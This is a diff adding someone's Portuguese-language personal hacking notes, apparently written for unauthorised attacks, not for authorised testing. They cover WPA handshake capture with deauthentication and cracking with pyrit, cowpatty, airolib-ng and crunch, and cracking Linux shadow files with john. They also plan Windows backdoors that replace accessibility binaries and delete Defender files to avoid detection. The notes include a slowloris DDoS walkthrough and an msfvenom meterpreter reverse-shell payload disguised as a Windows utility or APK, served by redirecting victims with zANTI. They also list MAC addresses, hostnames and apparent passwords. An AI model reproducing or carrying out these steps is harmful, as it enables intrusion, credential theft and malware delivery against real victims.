@@ -1,0 +1,1041 @@
+﻿pyrit
+
+
+https://translate.google.com.br/translate?hl=pt-BR&sl=es&u=https://m4ster00t.wordpress.com/2015/03/13/cracking-con-pyrit-para-que-prueben-y-pongan-a-trabajar-sus-gpus/&prev=search
+
+
+------------------------------
+
+
+
+pyrit -e nomedarede create_ssid
+
+
+
+(pyrit -i arquivo.txt import_passwords)
+
+
+para ataque com password txt usar
+
+(pyrit -i arquivo.txt -r arquivo.cap attack_passthrough)
+
+
+
+ataque com arquivos de hash.cow
+
+(pyrit -i hashfile -r arquivo.cap attack_cowpatty)
+
+
+
+Criando PMK's
+(pyrit batch)
+
+
+ataque com PMK's, deve usar as pmks geradas no proprio banco de dados.
+
+(pyrit -r arquivo.cap attack_batch)
+
+ataque com banco de dados do airolib-ng
+
+(pyrit -i wpadb -r -01.cap attack_db)
+
+
+
+checar por erros no db current do pyrit
+
+(pyrit check_db)
+
+
+
+opções a inserir no final do -e 
+
+create_essid delete_essid
+
+ 
+
+opções de exportação 
+
+export_cowpatty 
+export_hashdb (pro airolib) ver -i std..
+
+
+export_password
+
+passthrough Cumpute PMKs e escreve num arquivo
+
+
+
+help (printa informações gerais)
+
+
+
+relay 
+
+(
+
+
+tanto -i infile ou -o outfile suportam .gz ao gerar a lista adcione .gz no final para comprimir a wordlist e economizar armazenamento.
+
+
+
+pyrit -r pcap (--all-handshakes) (analyze)
+
+saidas: 
+Good: Handshake confirma a info da estação para o acess point.
+
+Workable: Quase foi capturado
+
+Bad: Não foi capturado!
+
+
+
+
+
+-u url link de banco de dados
+
+
+--------------------------------------------------------
+
+
+camandos usuais
+
+
+
+pyrit list_cores
+(listar core-nucleos)
+
+
+pyrit benchmark (testar capacidade total)
+
+
+
+todos os -i podem usar o final import_tipodoarquivo
+
+
+
+
+pyrit list_essids
+
+
+pyrit import_unique_passwords
+
+
+
+linhas perfeitas
+
+
+pyrit -r -e -b -o attack_batch
+
+export_cowpatty
+pyrit -o file.cow -e nomerede export_cowpatty
+
+
+
+A ideia é, gerar os arquivos txt, importar como passwords, batch e exportar o arquivo .cow e importa-lo no airolib-ng gerando um banco de dados exclusivo para
+o ESSID em campanha, e neste banco nenhum ESSID nem entra e nem sai. 
+
+Estima-se que se carregem 4 arquivos/dia o que significa 3 dias de trabalho para cobrir 
+todas as senhas de 8 digitos e 6 dias para todas incluso as de 9digcell e umas 2 de nomes. Ou seja em uma semana a probabilidade beira os 99% dependendo de 
+seu planejamento e elaboração no serviço.
+
+Então prepare-se porque ja foi dada a largada.
+
+
+
+------------------------------------------------------------
+
+
+
+Cowpatty
+
+
+
+https://marrocamp.blogspot.com.br/2015/10/cowpatty.html?m=1
+
+/
+cowpatty
+
+para inicialização de hashes.
+
+
+/genpmk para extrações de pmks de uma wordlist.
+
+
+/airolib-ng elaboração de databases contendo os essids, passwords e pmks
+
+
+/aircrack-ng -r para leritura precomputada das passphrases.
+
+
+
+-----------------------------------------
+
+
+
+Processo:
+
+
+
+É necessário criar uma pasta, capturar o handshake dentro desta pasta e manter todos os arquivos gerados em conjunto no diretorio onde foi feita a captura.
+
+
+cd Desktop 
+mkdir cowpatty 
+cd cowpatty
+
+ airmon-ng check kill 
+airmon-ng start wlan0
+ airodump-ng mon0 --channel --bssid --essid -w namewifi 
+
+
+aireplay-ng --deauth 3 -a mac mon0 
+
+capturado o handshake seguimos
+
+
+
+passo 1:
+
+
+
+cowpatty -f wordlist.txt -r arquivo-01.cap -s nomedarede
+
+
+
+assim cowpatty testará se a PSK esta no arquivo. Se sim ele exibe qual é se não ele passa direto.
+
+
+
+grep passwordprocurada arquivo.txt onde se procura.
+
+
+
+passo 2: 
+
+
+
+genpmk -f wordlist.txt -d SSID_nomedarede(para o arquivo hash) -s ESSID
+
+
+
+genpmk é um criador de passphrases que usa também as informações dos arquivos capturados para montar o quadro de processamento precomputado.
+
+
+
+podemos usar o seguinte comando para acompanhar o tamanho do arquivo sendo gerado
+
+
+
+stat hashfile | awk '( $1 == "Size:" ) { print $2 / 1048576 " MB Which is a huge word list!"}'
+
+
+
+
+para ver o tamanho de qualquer arquivo é só tirar o texto Which até o ! deixando só a grandeza entre os sinais e chaves.
+
+
+
+passo 3:
+
+
+
+feito o demorado arquivo fazemos a quebra do hash
+
+podemos fazelo pelo cowpatty:
+
+cowpatty -d hashfile -r arquivo-01.cap -s nomedarede(ESSID)
+
+
+ou 
+
+aircrack-ng -w hashfile arquivo-01.cap -e ESSID.
+
+
+
+----------------------------------------------------------------
+
+
+
+airolib-ng 
+
+captura handshake exclusivamente no canal slavando arquivo cap com nome da rede. 
+
+new term aireplay --deauth 3...
+
+airolib-ng namedobd --import passwd wordlist.txt
+
+
+raw > nomedarede.txt leafpad file.txt
+ 
+dentrodotxt escrever somente o nome da rede.
+
+ salva. 
+
+
+airolib-ng namedobd --import essid nomedarede.txt
+
+
+airolib-ng namedb --clean all
+
+
+airolib-ng namedb --stats
+
+
+airolib-ng namedb --batch 
+
+
+
+(esperar todos os comandos devolverem o terminal, importante não importar wordlists gigantes pra não demorar no Desktop, se for armazenar um db no HD ta valendo)
+
+
+
+airolib-ng namedb --verify all
+
+
+aircrack-ng -r namedb nomedarede-01.cap
+
+daqui ja da...
+
+ai vão as linhas adicionais pra testar outras coisas 
+
+
+
+dar prioridade a 1 essid
+
+airolib-ng nomedb --sql 'update essid set prio=(select min(prio)-1 from essid) where essid="VeryImportantEssid";'
+
+
+
+esperar a resposta ...1 rows affected.
+
+
+
+buscar padrões importantes na pmk.
+
+
+
+airolib-ng namedb --sql 'select hex(pmk) from pmk where hex(pmk) like "%DEADBEEF%" '
+
+
+
+airolib-ng namedb --import cowpatty cowexportoftest
+
+
+
+airolib-ng namedb --export cowpatty test cowexportftest
+
+
+
+importar essid
+
+
+
+echo Credito | airolib-ng namedb -import essid -
+
+importar senha
+
+
+
+echo 12345678 | airolib-ng -import passwd -
+
+iniciar processo em lote
+
+("airolib-ng namedb -batch")
+
+
+("airolib-ng namedb -stats")
+
+
+
+racha handshake
+
+
+
+aircrack-ng -r namedb -e Credito alvo10-01.cap
+
+
+
+crunch 8 8 -t %%%%%%%% --stdout | airolib-ng namedb -import passwd -
+
+
+
+tenho que dominar isso.
+
+ 
+também 
+
+
+
+genpmk -f caminhodoarquivo.txt ou.lst -d hashes -s ssid(nome da rede)
+
+
+
+cowpatty -d hashfile -r dumpfile -ssid
+
+
+
+
+TESTAR EDIÇÃO DE ESSID
+
+
+http://googleweblight.com/?lite_url=http://pythonclub.com.br/gerenciando-banco-dados-sqlite3-python-parte1.html&ei=lz8SrqYv&lc=pt-BR&s=1&m=633&
+host=www.google.com.br&ts=1510416950&sig=ANTY_L2ijLXRQqvwa1I1Kxi8tpynYygOlw
+
+
+
+
+FIM
+
+
+
+Baixar o Hashcat também.
+
+
+
+--------------------------------------------------------
+
+
+
+Quebrando senhas modos AFK Linux e Windows.
+
+
+
+unshadow /etc/passwd /etc/shadow >> senha_root.db
+
+john senha_root.db
+
+
+
+alterar senha:
+
+
+
+tela bloqueada ctrl+alt+f2 
+
+
+#passwd
+
+
+
+insira duas vezes e vualá. senha alterada 
+
+para voltar para o modo video normal ctrl+alt+f1 depois ctrl+alt+f7 
+
+
+
+
+control userpasswords2
+
+
+userinit.exe (explorador de arquivos)
+
+
+Utilman.exe
+
+
+utilman.exe
+
+
+sethc.exe
+
+
+EaseOfAccessDialog.exe (shift 5 vs)
+
+
+WindowsUpdateElevatedInstaller.exe
+
+
+Windows.Media.BackgroundPlayback.exe
+
+
+wimserv.exe
+
+
+wifitask.exe
+
+
+wiaacmgr.exe (pode muito ser backdor)
+
+
+WFS.exe (fax)
+
+
+wermgr.exe
+
+
+
+wbadmin.exe (ferramenta backup)
+
+
+wbengine.exe
+
+
+WebCache.exe
+
+
+WallpaperHost.exe
+
+
+waitfor.exe
+
+
+verifiergui.exe (editar conta)
+
+
+verifier.exe
+
+
+verclsid.exe
+
+
+vssadmin.exe 
+
+
+UserAccountBroker.exe
+
+
+osk.exe (teclado virtual)
+
+
+Narrator.exe
+
+
+vds.exe
+
+
+vdsldr.exe
+
+
+UserAccountControlSettings.exe
+
+
+tasklist.exe (lista os exe em uso)
+
+
+
+systeminfo.exe  (lista infos studo)
+
+
+psr (cria arquivos passo a passo)
+
+
+pwcriator (cria Desktop wtogo no pendrive)
+
+
+BdeHdCfg.exe (Preparação de unidade de disco para Cryptografia Bitlocker)
+chgport.exe (procura porta seriais)
+
+
+change.exe (muda de usuario)
+
+
+tscon.exe (anexar sessoes user e remote)
+
+
+qprocess.exe (ver os exe executando no host)
+
+
+PresentationSettings.exe (configura a maquina para não bloquear e desativa as notificações...)
+
+
+msg
+
+PrintBrmUi
+
+mblctr
+
+SnippingTool (selociona area da tela especifica para foto)
+
+
+rdpinit (logoff para remote acess rdp)
+
+
+mstsc (remote conect host)
+
+
+xpsrchvw (chmod do Windows permissões)
+
+
+mrt (remoção de softwares maliciosos)
+
+
+Firewall.cpl (Firewall do Windows)
+
+
+
+C:\Users\nomeuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Painel de Control
+
+e
+
+mspaint (paint)
+
+
+msinfo32
+
+
+control.exe (painel de controle)
+
+
+tcmsetup (client telefonia)
+
+
+
+SystemPropertiesDataExecutionPrevention
+
+
+printui
+
+ntprint
+
+
+cmdkey
+
+
+DiskSnapshot
+
+
+bootcfg
+
+
+Dism
+
+
+msdt
+
+
+rasautou.exe
+
+
+Taskmgr.exe /7
+
+
+Magnify.exe (lupa)
+
+
+ncpa.cpl (criar ponte)
+
+
+Run.lnk
+
+
+sihost (Tela Preta kkkk)
+
+
+locate Settings (no kali para achar o icone configurações no d system32)
+
+
+
+-------------------------------------------------------
+
+
+
+Estamos a procura da melhor opção para ser nossa backdoor no System32
+
+O melhor candidato até então é o 
+narrator.exe 
+que pertence ao facilidades de acesso da tela de bloqueio.. pode ser também o nosso prompt/NT,
+ a vantagem dele entrar como back é pelo fato de ele ter um botão de autoinicialização
+ automática o que renovaria nossas sessões automaticamente no msfconsole como prompt 
+perderiamos esta enorme praticidade.
+
+O Segundo candidato é o magnify.exe
+que é a lupa, 
+também consta em nosso menu de facilidade de acesso na tela de bloqueio, a grande vantagem
+ dele é que ao precionarmos as teclas WIN e + ele é chamado imediatamente o que estabilizaria 
+as nossas sessoes no metasploit não seria vantagem perder essa praticidade pelo prompt.
+
+
+O Terceiro candidato é o osk.exe ou mais conhecido por Teclado Virtual do Windows,
+ este não inicializa automaticamente o que não nos da a  vantagem de reconectar no msf,
+ mas em contrapartida é uma excelente opção para o prompt de comando NT,
+ porque usar o utilman acaba não sendo discreto, a pessoa vai perceber em pouco tempo
+ as violações, enquanto ao usar o teclado o utilman manterá o facilidade de acesso e o osk
+ que é sub arquivo sendo por isso menos visado ou clicado acaba sendo uma opção muito segura.
+
+
+Se for falar de uma backdoor EXPLICITA o iniciar é um ótimo candidato assim como o explorer. 
+Mas não queremos isso.
+
+ATENÇÃO:
+
+Esse tópico é extremamente importante,
+estamos falando de arquivos
+ e comandos que farão sua invasão ser 100% proveitosa.
+
+Para executar um comando ou programa de
+ forma remota durante a invasão. No seu lhost r > arquivo.txt dentro do arquivo escreva o nome
+ do programa | 1 comando a ser executado (ou outro programa)
+
+A grande sacada aqui é transformar
+ esse arquivo salvando como .bat ou usando mv para .bat dar o chmod 777 arquivo.bat, e fazer um
+ upload do mesmo para a área de trabalho do rhost e executar a tempo antes que o usuario perceba,
+ ou não ja que a ideia é que alguém o execute mesmo... Enfim dai podemos ver o máximo que somos
+ capaz de fazer em um rhost hackeado.
+
+Não precisamos usar o john para quebra de senhas graças ao truque inicial.
+
+--------------------------------------------------------
+
+
+Arquivos a copiar do Windows para apagar e backdor rodar sem deteção.
+
+
+System32/
+
+WF
+Firewall.cpl
+
+
+
+-------------------------
+
+ProgramFiles
+
+%ProgramFiles%\Windows Defender\MSASCui.exe tbm o MpCmdRun.exe
+
+
+
+c: Arquivos de Programas (x86)\Windows Defender
+
+c: ProgramFiles\Windows Defender
+ Advanced Threat Professional
+
+
+estima-se apx 35 mbs
+
+----------------------------------------------
+
+
+C: \Program Files (x86) \Google\Chrome\Application\
+
+ Chrome.exe
+
+
+Deve ter um substituto no Files System comum verificar lá tbm se não tiver show de bola.
+
+
+mas tem um em AppData tbm
+
+tem mais a fazer...
+
+
+
+--------------------------------------------------
+
+tempo 
+
+Em OITO minutos e CINQUENTA segundos aircrack-ng testa 1.000.000 (um milhão) de passwords.
+ Para testar 10.000.000 (dez milhões) de passwords estimam-se UMA HORA E VINTE E SETE SEGUNDOS.
+
+
+Quanto tempo levaria para o aircrack-ng testar 100.000.000 CEN MILHÕES de passwords?
+
+
+Estimam-se apx 15 horas
+
+Um indivíduo possui 2 computadores.
+
+O vermelho faz 1.000.000 em 8.56 minutos,
+ enquanto o preto faz o mesmo milhão em 1.27 hora.
+
+Para que o preto chegue a 10.000.000 estimam-se
+ 15 horas enquanto o vermelho faz estes mesmos dez milhões em 1.27 minutos.
+
+Concluí-se que é melhor
+ usar o preto para tentar wordlists abaixo de 100.000
+que duram 21 minutos em media.
+ E o vermelho pra cowpatty.
+
+cowpatty faz 1.000.000 em 39 minutos no vermelho, estima-se que façam-se 10.000.000
+ em 7 horas/dia.
+
+Cada Rede Levará no máximo 3 semanas para ser crackeadas e salvas se o airolib-ng aceitar 
+importações de pmk's.
+
+genpmk ainda não sabemos, mas saberemos em breve...
+Atualizar tempode geração de hashs.
+
+
+
+--REESCREVER VISANDO PYRIT
+
+------------'------------------------------------------
+
+
+airbase-ng estudar no link
+
+https://www.vivaolinux.com.br/artigo/Ataque-de-Rougue-AP-com-AIRBASENG
+
+
+estudar novos scripts tbm
+
+
+
+DDOS
+
+
+chmod +x pentmenu
+ls
+./pentmenu
+
+2) DDoS
+
+7)Slowryes
+
+
+target www.tal.com
+port
+ df 80
+ enter
+interval 5 a 15 df enter
+
+use ssl protocol (n)
+
+
+.........
+.........
+.........
+.........
+.........
+.........
+.
+.
+.
+---------------------------------------------------------------
+
+
+
+Routerpw 
+
+parece muito com o meta sploite 
+set modules com use
+
+completar tutorial
+
+
+usar nmap também
+
+
+nmap -T4 -A -v 192.168.0.1-255
+
+
+
+--------------------------------------------------------------
+
+
+Esquemapara attack organizado
+
+Gerando wordlists exatas em perfeita sincronia:
+
+pc 1 i5
+
+gera superlistas de 8 e 9 digitos cobrindo toda a demanda numérica de Datas, Telefeones fixos, e Numeros de celulares de 8 digitos e tbm os com nono digito.
+
+pc 2 i2 fica responsavel por gerar senhas medianas que beiram até os 10 mb no máximo.
+
+Xperia Z3 fica responsavel por gerar listas de até 5 mb ou que durem 7 minutos de testes.
+
+pc 4 AMD fica responsável por gerar senhas pequenas ja que o mesmo não tem capacidade de processar arquivos longos, Mas isso não é desvantagem de forma alguma ja que podemos então extender pensamentos lógicos que usam padrões para testar senhas com até 1 mb.
+
+
+Colunas Rca
+
+aeiou
+
+Dica usar + velozes no processo criativo
+
+---------------------------------------------------------------
+
+estudar ferramenta:
+
+packetforge-ng <mode> <options>
+
+----------------------------------------------------------------
+
+Calculo batch do airolib
+
+10.2 minutos = 200000
+x5=60min=1.000.000
+60min.10=10.000.000
+10x10.000.000=6 dias.
+
+----------------------------------------------------------------
+
+Macs Kel 
+
+Eth: 80:ee:73:9d:63:2e
+Wlan0: 40:e2:30:bc:c2:a2
+
+Celular 08:37:3D:6E:69:D1
+Markin Dellnot  64:a3:c4:b7:c3:30
+
+-------------------------------------------------------------
+
+Blackhat em ação
+
+Ler aquivo de Macs
+Configurar tudo
+Setar payloads no apache2 lembrar de editar o seguinte arquivo corretamente:
+
+Para tudo ser mais rápido é bom usar o mouse e carregador pra não ter interrupção.
+
+1 Boot Kali1 monitor mode, já estar ligado na rede alvo do ataque. Preparar sistema para reparar qualquer erro paralizando qualquer conexão. (EVASÃO)
+
+2 Boot Kali2 apache2 e msfconsole preparados. Payloads reservados no pendrive copie todo o conteúdo desta pasta in Desktop logue na rede assine os Payloads depois mv /var/www/html/, cd /var/www/html/ chmod 777 *
+ service apache2 restart.
+CTRL+N cd Desktop msfconsole.
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.2 LPORT=4444 -f exe  -e x86/shikata_ga_nai -i 10 R > utilitáriointernowindows.exe
+ 
+assinar todos os apk não esquecer disso quandk estiver gerando muitos
+
+
+3 Configurar o ZANTI para redirect editando conforme apache2 e Payload a ser usado:
+
+//192.168.0.101/101_CLICK-OK-PARA-SAIR.apk
+
+4 msfconsole 
+use exploit/multi/handler
+
+set PAYLOAD android/meterpreter/reverse_tcp
+
+ou ainda set PAYLOAD windows/meterpreter/reverse_tcp
+
+set LHOST 192.168.0.10(  )
+
+set LPORT 4444
+
+exploit
+
+----------------------------------------------------------------
+
+infos importante
+
+192.181.62.34 (noip externo)
+
+Como montar um rede zumbi (botnet) [2015] (DDoS)
+
+ppoe pastelaria
+
+Mai.yueliang
+my2016
+
+----------------------------------------------------------------
+
+FAZER OS ARQUIVOS INDICIES PAYLOADS NUMA PASTA DO PENDRIVE RAFAEL.
+
+FAZER PARA REDES 0.1 E 1.1...
+
+UM TERMINAL PARA APKS E OUTRO PARA EXE.
+
+assinar todos não esquecer.
+-----------------------------------------------------------------
+
+Eu Sei e quero saber mais sobre
+
+John Derrip
+maltego
+hidya http-head http-get http-post
+transferência ftp tftp ssh e telnet
+redirecionamento
+beef
+sslstrip
+intrusão a root tcpdump
+preconfiguração de dispositivos
+elevação de privilégios em 3 sistemas
+captura e descriptografia
+modificações de buffers com aireplay-ng
+credential haver
+airmon-ng
+airodump-ng
+aircrack-ng
+airbase-ng
+aireplay-ng
+airolib-ng
+cowpatty
+genpmk
+pyrit
+airdecap-ng
+packetforge-ng
+sslstrip
+arpspoof
+ettercap
+ZANTI
+setoolkit
+msfvenom
+msfconsole e módulos
+iptables
+hydra
+DDoS
+routerpn
+lazy
+linset
+wifite
+wireshark
+apt-get
+apache2
+tcpdump
+bully
+reaver
+wash
+crunch
+echo
+stat
+sqlmap
+sqlite3
+zarp
+netattack2
+BlackHat Tool
+Auto WebApp Pentest
+APT2
+Microsoft .NET Framework RCE...
+lazysqlmap
+routerpw
+
+
+--------------------------------------------------------------
+
+Senhas longas e dificeis
+
+ultramicroscopicossilicovulcanoconiose
+
+Candidatas:
+
+pneumoultramicroscopicossilicovulcanoconiose
+
+anticonstitussionalissimamente
+
+methylchloroisothiazolinone
+
+Paraclorobenzilpirrolidinonetilbenzimida
+
+Piperidinoetoxicarbometoxibenzofenona 
+
+Tetrabrometacresolsulfonoftaleína
+
+Dimetilaminofenildimetilpirazolona
+
+Hipopotomonstrosesquipedaliofobia
+
+Monosialotetraesosilgangliosideo
+
+Oftalmotorrinolaringologista
+
+-----------------------------------------------------------------
+
+Nomes para wordlists
+
+http://nomesportugueses.blogspot.in/p/nomes-brasileiros-de-z.html?m=1
+
+http://nomesportugueses.blogspot.in/2009/04/nomes-masculinos-de-a-z.html?m=1
+
+https://books.google.com.br/books?id=LbJKDAAAQBAJ&pg=PA95&lpg=PA95&dq=o+que+n%C3%A3o+fazer+no+airolib-ng?&source=bl&ots=Q2zgllJ2NA&sig=SC1BfAV_fDlsZqE7Vw9Svj3S7Bk&hl=pt-BR&sa=X&ved=2ahUKEwj-7smL46TXAhULFpAKHdkBA_cQ6AEwA3oECBgQAA#v=onepage&q=o%20que%20n%C3%A3o%20fazer%20no%20airolib-ng%3F&f=false
+
+------------------------------------------------------------------
+
+DESKTOP-OBQREOG\Blackhat
+
+DESKTOP-QKLU4SQ\rafae
+
+------------------------------------------------------------------
+
